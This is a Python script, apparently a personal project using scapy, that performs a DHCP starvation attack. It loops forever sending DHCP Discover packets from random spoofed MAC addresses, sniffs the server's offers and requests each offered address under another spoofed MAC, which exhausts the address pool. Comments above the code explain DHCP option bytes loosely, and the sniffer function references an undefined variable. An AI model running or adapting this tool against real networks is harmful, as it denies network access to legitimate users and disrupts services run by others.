import scapy
import pcapy 
import netifaces
import threading 
import time 
import random
import subprocess
from time import sleep
from scapy.all import *



# So the DHCP packet has byte codes options    
# : DHCPOptionsField                    = ("b''")
# These byte codes kinda represent paramters to the DHCP server like giving the subnet mask can help determine the range

# Here are some more important options, i think i understand why is going to be diffuclt we have to include every address via byte codes ;0 

"""
	options = b'\x35\x01\x01\x32\x04\x0a\x00\x00\x01\x0a\x00\x00\x64'
	Here's a breakdown:
	0x35: DHCP Message Type Option (DHCP Discover)
	0x01: Length of the message type option
	0x01: DHCP Discover (message type)
	0x32: Requested IP address option
	0x04: Length of the IP address option (4 bytes)
	0x0a\x00\x00\x01: Requested IP address (10.0.0.1
	0x0a\x00\x00\x64: Client identifier or other data
"""		
	
def spoofMac():
	choices = "0123456789abcdef"
	result = "02:" 
	count = 0 
	while count != 5: 
		result = result + random.choice(choices) + random.choice(choices) + ":" 
		count = count + 1
	return result[:len(result) - 1]

def packet_analyzer(packet): 
	if DHCP in packet: 
		if packet[DHCP].options[0][1] == 2 and BOOTP in packet:
			print(packet[BOOTP].xid)
			xid = packet[BOOTP].xid
			yiaddr = packet[BOOTP].yiaddr
			ciaddr = packet[BOOTP].ciaddr
			#print(packet[DHCP].options)
			#print(f"BOOTP Fields: {packet[BOOTP].fields}")
			ether 	= Ether(src=spoofMac(), dst="ff:ff:ff:ff:ff:ff")
			ip 	= IP(src='0.0.0.0', dst="255.255.255.255")
			udp 	= UDP(sport=68, dport=67)
			bootp	= BOOTP(xid=xid, yiaddr=yiaddr, ciaddr=ciaddr,chaddr=spoofMac())
			dhcp = DHCP(options=[('message-type', 3), ('requested_addr', yiaddr), 'end'])
			packet = ether / ip / udp / bootp / dhcp 
			sendp(packet)
			
			
def sniffer(): 
	sniff(prn=packet_analyzer) # Find DHCP offer
	print(result)

def dhcpRequest():
	mac 	= spoofMac()
	ether 	= Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
	ip_p 	= IP(src='0.0.0.0', dst="255.255.255.255")
	udp 	= UDP(sport=68, dport=67)
	bootp 	= BOOTP(op=1)
	dhcp 	= DHCP(options=[("message-type", "discover"), "end"])
	packet 	= ether / ip_p / udp / bootp / dhcp
	sendp(packet) # Send Initial Request for an IP 
	


if __name__ == "__main__":
	def dhcpRequest_loop(): 
		while True:
			dhcpRequest()
			sleep(3)
	print(spoofMac())
	sniff_thread = threading.Thread(target=sniffer)
	sniff_thread.start()
	dhcp_thread = threading.Thread(target=dhcpRequest_loop)
	dhcp_thread.start()
	
	
	
